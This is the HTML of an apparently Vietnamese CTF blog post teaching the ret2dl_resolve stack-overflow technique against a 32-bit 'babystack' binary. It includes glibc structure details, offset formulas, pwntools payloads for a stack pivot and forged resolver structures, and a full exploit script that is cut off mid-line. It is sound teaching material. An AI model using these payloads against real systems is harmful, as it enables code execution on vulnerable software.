@@ -1,0 +1,792 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  data-theme="dark" >
+  <head>
+  <meta charset="utf-8">
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
+  <script data-pjax>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+
+    gtag('config', 'true');
+  </script>
+  <!-- End Google Analytics -->
+
+
+  
+
+  
+
+  
+  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};</script>
+  
+  
+  <title>
+    ret2dlresolve note |
+    
+    whoisthatguy
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="Trong một số trường hợp khi ta overflow mà không có các hàm trong PLT thích hợp để leak libc ra thì ret2dl_resolve là một kỹ thuật để lấy được shell. Trong bài này mình sẽ giới thiệu tóm tắt về cách r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dlresolve note">
+<meta property="og:url" content="http://wh0isthatguy.github.io/2023/07/30/ret2dlresolve/index.html">
+<meta property="og:site_name" content="whoisthatguy">
+<meta property="og:description" content="Trong một số trường hợp khi ta overflow mà không có các hàm trong PLT thích hợp để leak libc ra thì ret2dl_resolve là một kỹ thuật để lấy được shell. Trong bài này mình sẽ giới thiệu tóm tắt về cách r">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJeZGIMi3.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/By-vOLMsn.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkdIp8zoh.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJWzMvGo3.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkDp5tGj3.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByYZotfoh.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJUdgcMi2.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1i7M9Min.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJbymqMon.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BySV4qzoh.png">
+<meta property="article:published_time" content="2023-07-30T08:56:34.000Z">
+<meta property="article:modified_time" content="2024-10-29T09:59:16.460Z">
+<meta property="article:author" content="whoisthatguy">
+<meta property="article:tag" content="linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/rJeZGIMi3.png">
+  
+  
+  
+    <link rel="shortcut icon" href="https://uploads-public.hackmd.io/upload_a391ca5a866f9b0463c380b8e3b6d963.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff5252" />
+          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+         M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="#ff5252" />
+        </svg>
+      </div>
+      <div class="loading-word">UwU....</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class="main-nav-icon icon-taichi"></div>
+        <a class="main-nav-link" href="/about">About</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <img fetchpriority="high" src="https://hackmd.io/_uploads/S1i7M9Min.png" alt="ret2dlresolve note">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">ret2dlresolve note</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content">
+          
+          <section id="main"><article id="post-ret2dlresolve" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2023/07/30/ret2dlresolve/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2023-07-30T08:56:34.000Z" itemprop="datePublished">2023-07-30</time>
+    <time style="display: none;" id="post-update-time">2024-10-29</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/pwn/" data-aos="zoom-in">pwn</a><a class="article-category-link" href="/categories/pwn/stack-overflow/" data-aos="zoom-in">stack overflow</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>Trong một số trường hợp khi ta overflow mà không có các hàm trong PLT thích hợp để leak libc ra thì ret2dl_resolve là một kỹ thuật để lấy được shell. Trong bài này mình sẽ giới thiệu tóm tắt về cách ret2dl_resolve ở glibc 2.37 hoạt động qua một bài demo.</p>
+<h2 id="Prerequisites"><a href="#Prerequisites" class="headerlink" title="Prerequisites :"></a>Prerequisites :</h2><p>Do nếu mình giải thích chi tiết từng dòng code chạy sau thì nó rất rất dài và giống như reinvent the wheel nên các bạn có thể đọc trước ở đây:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://syst3mfailure.io/ret2dl_resolve/">syst3mfailure</a> - Phân tích chi tiết từng dòng </li>
+<li><a target="_blank" rel="noopener" href="http://phrack.org/issues/58/4.html">phrack article ở mục 5</a> - bài original public về kỹ thuật này </li>
+<li><a target="_blank" rel="noopener" href="https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62">ricardo2197</a> - Bài khá hay tóm tắt về nó</li>
+<li><a target="_blank" rel="noopener" href="https://www.da.vidbuchanan.co.uk/blog/static/babystack.tar.gz">file</a> binary mình demo</li>
+</ul>
+<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Kỹ thuật này lợi dụng việc lazy binding tức quá trình resolve symbol ở runtime không có bound check từ đó ta khiến nó overwrite địa chỉ GOT của một hàm nào đó thành <code>system</code></p>
+<p><img src="https://hackmd.io/_uploads/rJeZGIMi3.png"></p>
+<p>Khi ta gọi hàm <code>read</code> thì những việc sau đây xảy ra :</p>
+<ol>
+<li>Nhảy vào .plt của <code>read</code> </li>
+<li>jmp vào một địa chỉ trong <code>.got.plt</code>. </li>
+<li>Nếu địa chỉ này chưa resolve thì nó sẽ trỏ ngược lại vào địa chỉ tiếp theo cần thực hiện trong <code>.plt</code>. Nếu resolve rồi thì thực hiện nó</li>
+<li>Nếu chưa resolve thì bước này là bước đi resolve</li>
+</ol>
+<p>Trong quá trình đi resolve nó sẽ push 2 arguments lên stack : <code>linkmap</code> và <code>reloc_arg</code>.</p>
+<ul>
+<li><code>linkmap</code> là chỗ chứa các địa chỉ ở bên dưới - ở đây ta không quan tâm về nó<br><img src="https://hackmd.io/_uploads/By-vOLMsn.png"></li>
+<li><code>reloc_arg</code> dùng để tính offset mà ta cần cực kỳ để ý.</li>
+</ul>
+<p>Mục tiêu của ret2dl_resolve như sau:</p>
+<ul>
+<li>Fake argument <code>reloc_arg</code> </li>
+<li>Fake 3 chunk STRTAB, SYMTAB,JMPREL</li>
+</ul>
+<p>Để fake đúng ta cần tính offset <strong>chuẩn</strong> . 3 chunk ta fake thường nằm ở heap hoặc bss của binary. Đây là địa chỉ mà ta phải có control hoàn toàn.<br>Lưu ý : địa sym và SYMTAB, reloc và JMPREL mà mình đề cập bên dưới là các địa chỉ khác nhau hoàn toàn.</p>
+<h2 id="Details"><a href="#Details" class="headerlink" title="Details:"></a>Details:</h2><h3 id="STRTAB"><a href="#STRTAB" class="headerlink" title="STRTAB"></a>STRTAB</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/10s 0x804822c</span><br><span class="line">0x804822c:      &quot;&quot;</span><br><span class="line">0x804822d:      &quot;libc.so.6&quot;</span><br><span class="line">0x8048237:      &quot;_IO_stdin_used&quot;</span><br><span class="line">0x8048246:      &quot;read&quot;</span><br><span class="line">0x804824b:      &quot;alarm&quot;</span><br><span class="line">0x8048251:      &quot;__libc_start_main&quot;</span><br><span class="line">0x8048263:      &quot;__gmon_start__&quot;</span><br><span class="line">0x8048272:      &quot;GLIBC_2.0&quot;</span><br><span class="line">0x804827c:      &quot;&quot;</span><br><span class="line">0x804827d:      &quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>STRTAB chỉ là nơi chứa strings. Mục tiêu của ta khi fake nó chỉ là ghi <code>system\x00</code> (null terminated str) vào một địa chỉ</p>
+<h3 id="SYMTAB"><a href="#SYMTAB" class="headerlink" title="SYMTAB"></a>SYMTAB</h3><p>Một chunk sym được định nghĩa như sau:</p>
+<ul>
+<li>Ở x64<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf64_Word	st_name;		/* Symbol name (string tbl index) */</span><br><span class="line">  unsigned char	st_info;		/* Symbol type and binding */</span><br><span class="line">  unsigned char st_other;		/* Symbol visibility */</span><br><span class="line">  Elf64_Section	st_shndx;		/* Section index */</span><br><span class="line">  Elf64_Addr	st_value;		/* Symbol value */</span><br><span class="line">  Elf64_Xword	st_size;		/* Symbol size */</span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure></li>
+<li>Ở x32<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word	st_name;		/* Symbol name (string tbl index) */</span><br><span class="line">  Elf32_Addr	st_value;		/* Symbol value */</span><br><span class="line">  Elf32_Word	st_size;		/* Symbol size */</span><br><span class="line">  unsigned char	st_info;		/* Symbol type and binding */</span><br><span class="line">  unsigned char	st_other;		/* Symbol visibility */</span><br><span class="line">  Elf32_Section	st_shndx;		/* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>Cách mà source tính ra chunk này : </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]</span><br><span class="line">// which is the same as :</span><br><span class="line">const ElfW(Sym) *sym = &amp;symtab[(reloc-&gt;r_info) &gt;&gt; 8]</span><br><span class="line">// also the same as :</span><br><span class="line">*sym = SYMTAB + index *sizeof(sym)</span><br><span class="line">// index = (reloc-&gt;r_info) &gt;&gt; 8</span><br><span class="line"></span><br><span class="line">----------------------------------------------</span><br><span class="line">const ElfW(Sym) *const symtab</span><br><span class="line">    = (const void *) D_PTR (l, l_info[DT_SYMTAB])</span><br><span class="line">                      --------SYMTAB--------</span><br></pre></td></tr></table></figure>
+
+<p>x64 và x32 chỉ khác mỗi size còn lại tương tự</p>
+<p><img src="https://hackmd.io/_uploads/HkdIp8zoh.png"></p>
+<p>Ở đây chúng ta chỉ quan tâm đến <code>st_other</code> và <code>st_name</code></p>
+<ul>
+<li><code>st_other</code> : bắt buộc &#x3D; 0</li>
+<li><code>st_name</code> : chứa offset đến string <code>system</code> mà ta fake</li>
+</ul>
+<h3 id="JMPREL"><a href="#JMPREL" class="headerlink" title="JMPREL"></a>JMPREL</h3><p>Một chunk reloc được định nghĩa như sau : </p>
+<ul>
+<li><p>x32</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>x64</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br></pre></td></tr></table></figure>
+<p>Cách mà source tính ra chunk này:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line"><span class="comment">// the same as</span></span><br><span class="line">reloc = JMPREL + reloc_offset</span><br><span class="line"><span class="comment">// such that</span></span><br><span class="line">reloc_offset = reloc_arg <span class="comment">//x32</span></span><br><span class="line">reloc_offset = reloc_arg *<span class="number">0x18</span> <span class="comment">//x64</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/SJWzMvGo3.png"></p>
+<h2 id="But-howww"><a href="#But-howww" class="headerlink" title="But howww ???"></a>But howww ???</h2><h3 id="Basic-algorithm-true-case"><a href="#Basic-algorithm-true-case" class="headerlink" title="Basic algorithm (true case)"></a>Basic algorithm (true case)</h3><p>Trong trường hợp thoả mãn tất cả điều kiện thì nó sẽ resolve bằng thuật toán sau</p>
+<ol>
+<li>push <code>reloc_arg</code>, <code>linkmap</code></li>
+<li>get <code>SYMTAB</code> address</li>
+<li>get <code>STRTAB</code> address</li>
+<li>get a ptr to <code>ELF32_Rela</code> &#x2F; <code>ELF64_Rela</code> struct</li>
+<li>get a ptr to <code>ELF32_Sym</code> &#x2F; <code>ELF64_Sym</code> struct (base on a ptr in step 4)</li>
+<li>check <code>r_info</code> ending with 0x7 </li>
+<li>check <code>st_other == 0</code> or not</li>
+<li>do some stuff to check the version</li>
+<li>get the address from glibc base on <code>STRTAB + st_name</code></li>
+</ol>
+<h3 id="Observation"><a href="#Observation" class="headerlink" title="Observation:"></a>Observation:</h3><ol>
+<li>Ta không thể fake <code>SYMTAB</code>, <code>STRTAB</code> , <code>linkmap</code> (hmmm có thể có nhưng kỹ thuật khá khó)</li>
+<li>Bước 4 tính ptr đó bằng công thức:  <code>reloc = JMPREL + reloc_arg</code> </li>
+<li>Bước 5 tính ptr đó bằng công thức <code>sym = SYMTAB + (r_info &gt;&gt; 8) * sizeof(sym)</code></li>
+</ol>
+<h3 id="Cac-buoc-tinh"><a href="#Cac-buoc-tinh" class="headerlink" title="Các bước tính:"></a>Các bước tính:</h3><ol>
+<li>Tìm 3 địa chỉ <code>addr1</code> , <code>addr2</code> ,<code>addr3</code> mà chúng ta có quyền control</li>
+<li>Fake ELF32_Rela &#x2F; ELF64_Rela <code>addr1</code> struct</li>
+</ol>
+<ul>
+<li>reloc_arg &#x3D; <code>addr1</code>  - JMPREL <strong>(x32)</strong></li>
+<li>reloc_arg &#x3D; (<code>addr1</code>  - JMPREL) &#x2F; 24 <strong>(x64)</strong></li>
+<li>r_info &#x3D; (((<code>addr2</code> - SYMTAB) &#x2F; sizeof(sym)) &lt;&lt; 8) | 7</li>
+<li><code>addr1</code> chunk : [GOT,  r_info]</li>
+</ul>
+<ol start="3">
+<li>Fake ELF32_Sym &#x2F; ELF64_Sym <code>addr2</code> struct :</li>
+</ol>
+<ul>
+<li>st_name &#x3D; <code>addr3</code> - STRTAB</li>
+<li>st_value, st_size, st_info, st_other, st_shndx &#x3D; 0</li>
+</ul>
+<ol start="4">
+<li>write <code>system</code> to <code>addr3</code></li>
+</ol>
+<p>Trong quá trình fake thì các chunk đấy phải nằm đúng một ô nhớ 4 byte hoặc 8 byte ở một địa chỉ -&gt; align khi thấy không phù hợp</p>
+<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>Đầu tiên ta chạy lệnh này để note lại các giá trị </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d babystack</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0xf14 contains 24 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so.6]</span><br><span class="line"> 0x0000000c (INIT)                       0x80482c8</span><br><span class="line"> 0x0000000d (FINI)                       0x80484f4</span><br><span class="line"> 0x00000019 (INIT_ARRAY)                 0x8049f08</span><br><span class="line"> 0x0000001b (INIT_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x8049f0c</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               4 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x80481ac</span><br><span class="line"> 0x00000005 (STRTAB)                     0x804822c</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x80481cc</span><br><span class="line"> 0x0000000a (STRSZ)                      80 (bytes)</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000015 (DEBUG)                      0x0</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x804a000</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   24 (bytes)</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000017 (JMPREL)                     0x80482b0</span><br><span class="line"> 0x00000011 (REL)                        0x80482a8</span><br><span class="line"> 0x00000012 (RELSZ)                      8 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x8048288</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 1</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x804827c</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure>
+
+<p>Note lại</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYMTAB = 0x080481cc</span><br><span class="line">STRTAB = 0x0804822c</span><br><span class="line">JMPREL = 0x080482b0</span><br></pre></td></tr></table></figure>
+
+<p>Vào ida thì ta dễ dàng thấy rằng bị bof</p>
+<p><img src="https://hackmd.io/_uploads/BkDp5tGj3.png"></p>
+<p>Vào gdb thì thấy rằng không có hàm nào thích hợp để giúp ta leak libc -&gt; ret2dl_resolve</p>
+<p><img src="https://hackmd.io/_uploads/ByYZotfoh.png"></p>
+<p>Sau một hồi test với binary thì thấy rằng ta cần pivot stack vào bss() do arguments 1 tức <code>reloc_arg</code> cần phải ở đầu stack</p>
+<p>Quá trình pivot stack cũng như làm sau để bof 1 file x32 sẽ không trình bày ở đây</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addr1 = <span class="number">0x804af00</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span> + p32(addr1)</span><br><span class="line"></span><br><span class="line">payload +=  p32(exe.plt[<span class="string">&#x27;read&#x27;</span>]) + p32(<span class="number">0x8048455</span>)+  p32(<span class="number">0</span>) + p32(addr1) + p32(<span class="number">0x80</span>)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>Trong đó <code>0x8048455</code> là gadget <code>leave_ret</code>. Ở đây chúng ta thực hiện ghi 2 lần. </p>
+<ul>
+<li>Lần 1 tức payload trên để pivot stack</li>
+<li>Lần 2 gửi payload ret2dl_resolve lên bss()</li>
+</ul>
+<p>Payload 2 của mình có dạng sau</p>
+<p><img src="https://hackmd.io/_uploads/HJUdgcMi2.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">addr1 += <span class="number">0x14</span></span><br><span class="line">reloc_args = (addr1 - JMPREL)</span><br><span class="line">addr2 = <span class="number">0x804af1c</span></span><br><span class="line">success(<span class="string">&quot;FAKE ELF32_SYM addr2 : &quot;</span> + <span class="built_in">hex</span>(addr2))</span><br><span class="line">r_info = (addr2- SYMTAB) // <span class="number">16</span></span><br><span class="line">r_info = (r_info &lt;&lt;<span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;FAKE ELF32_RELA addr1 : &quot;</span> + <span class="built_in">hex</span>(addr1))</span><br><span class="line">success(<span class="string">&quot;CACULATED reloc_args: &quot;</span> + <span class="built_in">hex</span>(reloc_args))</span><br><span class="line">success(<span class="string">&quot;r_info : &quot;</span> + <span class="built_in">hex</span>(r_info))</span><br><span class="line"></span><br><span class="line">string = <span class="number">0x0804af2c</span> - STRTAB</span><br></pre></td></tr></table></figure>
+
+<p>Do <code>addr1</code> sau khi chạy payload 1 đang là <code>rsp</code><br>nên mình cộng thêm 0x14 tức chỗ để fake <code>ELF32_Rela</code> struct.</p>
+<p><code>string</code> trong code trên là <code>st_name</code> fake</p>
+<p>Payload sau khi gửi </p>
+<p><img src="https://hackmd.io/_uploads/S1i7M9Min.png"></p>
+<p>Ta có thể thấy là các địa chỉ ta fake nằm trọn trong 1 ô vùng nhớ. Các địa chỉ khác tính như công thức mình đưa ra ở trên .</p>
+<p>Chỗ padding này như sau</p>
+<p><img src="https://hackmd.io/_uploads/rJbymqMon.png"></p>
+<ul>
+<li><code>0x804af08</code> là esp tức là <code>reloc_arg</code></li>
+<li>2 địa chỉ tiếp theo là phần padding. Ở đây mình gửi string <code>sh</code> và tiếp theo mình gửi vào <code>0x804af10</code> địa chỉ trỏ tới <code>sh</code>. Lý do của việc đó là vì khi ta thực hiện resolve xong thì nó sẽ thực hiện hàm <code>system</code> đấy. Do là x32 nên theo calling convention thì nó expect arguments ở <code>esp+0x8</code></li>
+</ul>
+<p>Ta chạy script thì lấy được shell</p>
+<p><img src="https://hackmd.io/_uploads/BySV4qzoh.png"></p>
+<p>Full script : </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">exe = ELF(<span class="string">&quot;babystack&quot;</span>)</span><br><span class="line">p = process(exe.path)</span><br><span class="line"></span><br><span class="line">SYMTAB = <span class="number">0x080481cc</span></span><br><span class="line">STRTAB = <span class="number">0x0804822c</span></span><br><span class="line">JMPREL = <span class="number">0x080482b0</span></span><br><span class="line"></span><br><span class="line">GOT = <span class="number">0x804a010</span></span><br><span class="line">ret = <span class="number">0x080482d2</span></span><br><span class="line"></span><br><span class="line">addr1 = <span class="number">0x804af00</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span> + p32(addr1)</span><br><span class="line"></span><br><span class="line">payload +=  p32(exe.plt[<span class="string">&#x27;read&#x27;</span>]) + p32(<span class="number">0x8048455</span>)+  p32(<span class="number">0</span>) + p32(addr1) + p32(<span class="number">0x80</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">addr1 += <span class="number">0x14</span></span><br><span class="line">reloc_args = (addr1 - JMPREL)</span><br><span class="line">success(<span 